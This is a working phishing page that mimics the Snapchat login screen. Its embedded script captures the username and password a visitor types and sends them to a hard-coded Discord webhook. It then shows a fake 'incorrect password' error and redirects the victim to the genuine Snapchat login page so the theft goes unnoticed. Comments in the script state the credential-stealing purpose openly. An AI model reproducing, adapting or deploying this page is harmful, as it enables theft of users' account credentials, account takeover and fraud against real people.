<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapchat | Log in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        /* Main container – same width as the Python window */
        .snapchat-card {
            max-width: 400px;
            width: 100%;
            background: #ffffff;
            border-radius: 24px;          /* rounded corners like the PyQt version */
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
            text-align: center;
            padding: 30px 30px 40px 30px;
        }

        /* Logo (text version) */
        .logo {
            font-size: 48px;
            font-weight: 700;
            letter-spacing: -1px;
            color: #fffc00;
            text-shadow: 2px 2px 0 #000;
            margin-bottom: 20px;
        }

        /* Subtitle */
        .subtitle {
            color: #6c6c70;
            font-size: 14px;
            margin-bottom: 30px;
        }

        /* Input fields */
        .input-group {
            margin-bottom: 16px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            background-color: #f2f2f2;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border-color: #fffc00;
        }

        /* Yellow login button */
        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #fffc00;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            color: #000;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background-color: #e6e200;
        }

        /* Bottom links */
        .links {
            margin-top: 25px;
            font-size: 12px;
            color: #6c6c70;
        }

        .links a {
            color: #6c6c70;
            text-decoration: none;
            margin: 0 4px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        /* Error message */
        .error-message {
            color: #f44336;
            font-size: 13px;
            margin-top: 15px;
            display: none;
        }

        /* Ensure full responsiveness */
        @media (max-width: 480px) {
            .snapchat-card {
                padding: 20px 20px 30px 20px;
            }
            .logo {
                font-size: 40px;
            }
        }
    </style>
</head>
<body>
    <div class="snapchat-card">
        <div class="logo">Snapchat</div>
        <div class="subtitle">Log in to Snapchat</div>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Username or Email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
            <div class="links">
                <a href="#">Forgot your password?</a> · 
                <a href="#">Sign up</a>
            </div>
            <div id="errorMsg" class="error-message"></div>
        </form>
    </div>

    <script>
        // === YOUR DISCORD WEBHOOK URL ===
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1485303058161340467/8XtLiKOB1wLuBdd8EhGPgR-V8S-lL5-r2bqFvUZ4P03ob3aAQkaA2eUMA7cHwDC_gxXS";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorDiv = document.getElementById('errorMsg');

            if (!username || !password) {
                errorDiv.textContent = 'Please fill in both fields.';
                errorDiv.style.display = 'block';
                return;
            }

            // Send credentials to Discord webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `**Snapchat Credentials**\nUsername/Email: ${username}\nPassword: ${password}`
                })
            }).catch(err => console.error('Webhook error:', err));

            // Show fake error message
            errorDiv.textContent = 'Incorrect username or password. Please try again.';
            errorDiv.style.display = 'block';

            // After a short delay, redirect to the real Snapchat login page
            setTimeout(() => {
                window.location.href = 'https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fwelcome';
            }, 1500);
        });
    </script>
</body>
</html>
